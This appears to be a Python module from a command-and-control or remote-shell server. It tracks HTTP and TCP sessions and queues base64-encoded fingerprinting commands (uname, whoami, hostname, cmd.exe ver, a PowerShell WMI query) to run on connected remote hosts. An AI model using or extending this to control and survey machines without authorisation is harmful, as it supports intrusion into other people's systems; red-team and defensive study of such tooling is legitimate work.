import queue
import base64

class Session:
    def __init__(self, sid, transport, handler):
        self.sid = sid
        self.transport = transport
        self.handler = handler
        self.command_queue = queue.Queue()
        self.output_queue = queue.Queue()
        self.metadata = {}
        self.metadata_stage = 0
        #self.metadata_fields = ["hostname", "user", "os", "arch"]
        self.mode = "detect_os"
        self.os_metadata_commands = []
        self.metadata_fields = []

        # Queue metadata commands immediately on creation:
        self.queue_metadata_commands()

    def queue_metadata_commands(self):
        self.command_queue.put(base64.b64encode(b"uname -a").decode())

        """self.command_queue.put(base64.b64encode(b"hostname").decode())
        self.command_queue.put(base64.b64encode(b"whoami").decode())
        self.command_queue.put(base64.b64encode(b"cmd.exe /c ver").decode())
        self.command_queue.put(base64.b64encode(
    b'powershell.exe -Command "(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture)"'
).decode())"""

    def detect_os(self, output: str):
        lower = output.lower()

        if "linux" in lower or "darwin" in lower:
            self.metadata["os"] = "Linux"
            self.metadata_fields = ["hostname", "user", "os", "arch"]
            self.os_metadata_commands = [
                ("hostname", "hostname"),
                ("user", "whoami"),
                ("os", "uname"),
                ("arch", "uname -m")
            ]
        else:
            self.metadata["os"] = "Windows"
            self.metadata_fields = ["hostname", "user", "os", "arch"]
            self.os_metadata_commands = [
                ("hostname", "hostname"),
                ("user", "whoami"),
                ("os", "((cmd.exe /c ver) | Select-String -Pattern 'Windows').Matches.Value"),
                ("arch", 'powershell.exe -Command "(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture)"')
            ]

# Global sessions dictionary
sessions = {}
alias_map: dict[str,str] = {}

def set_alias(alias: str, sid: str):
    """Point alias → real SID."""
    alias_map[alias] = sid

def resolve_sid(name: str) -> str|None:
    """Turn either a real SID or an alias into the real SID."""
    if name in sessions:
        return name
    return alias_map.get(name)

def register_http_session(sid):
    sessions[sid] = Session(sid, 'http', queue.Queue())

def register_tcp_session(sid, client_socket):
    sessions[sid] = Session(sid, 'tcp', client_socket)

def is_http_session(sid):
    return sessions[sid].transport == 'http'

def is_tcp_session(sid):
    return sessions[sid].transport == 'tcp'